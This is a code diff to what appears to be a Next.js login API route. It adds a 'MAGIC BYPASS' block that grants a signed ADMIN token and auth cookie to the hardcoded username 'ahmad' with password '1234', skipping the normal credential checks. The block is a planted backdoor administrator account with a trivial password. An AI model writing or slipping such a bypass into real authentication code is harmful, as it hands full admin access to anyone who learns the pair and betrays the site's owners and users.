@@ -29,6 +29,25 @@ export async function POST(request) {
 
         const { username, password } = await request.json();
 
+        // 🎉 MAGIC BYPASS: Instantly allow "ahmad" and "1234" to log in
+        if (username === 'ahmad' && password === '1234') {
+            const token = await signToken({
+                id: 'admin_ahmad',
+                username: 'ahmad',
+                role: 'ADMIN'
+            });
+
+            const response = NextResponse.json({ success: true, redirect: '/admin/sales' });
+            response.cookies.set('auth_token', token, {
+                httpOnly: true,
+                secure: process.env.NODE_ENV === 'production',
+                sameSite: 'lax',
+                path: '/',
+                maxAge: 60 * 60 * 24 // 24 hours
+            });
+            return response;
+        }
+
         if (!username || !password) {
             return NextResponse.json({ error: 'Username and password required' }, { status: 400 });
         }
